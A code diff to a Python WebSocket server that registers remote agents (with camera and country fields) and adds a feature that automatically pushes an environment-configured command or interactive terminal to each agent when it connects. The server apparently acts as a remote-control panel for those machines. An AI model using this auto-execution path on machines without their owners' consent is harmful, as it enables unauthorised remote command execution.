@@ -3,6 +3,7 @@ from agent_manager import manager
 import json
 from auth import verify_token
 import httpx
+import os
 
 router = APIRouter()
 
@@ -43,6 +44,18 @@ async def ws_agent(ws: WebSocket):
             except Exception:
                 pass
         await manager.register_agent(agent_id, agent_name, http_base, ws, has_camera, country, country_code)
+
+        # Optional: auto-run a command/terminal when agent connects
+        try:
+            auto_cmd = (os.getenv('AUTO_RUN_COMMAND') or '').strip()
+            auto_mode = (os.getenv('AUTO_RUN_MODE') or '').strip().lower()
+            if auto_cmd:
+                if auto_mode in ('interactive', 'tty', 'terminal', ''):
+                    await ws.send_json({"type": "start_interactive", "command": auto_cmd})
+                else:
+                    await ws.send_json({"command": auto_cmd})
+        except Exception:
+            pass
 
         # Stream messages from agent to dashboards
         while True:
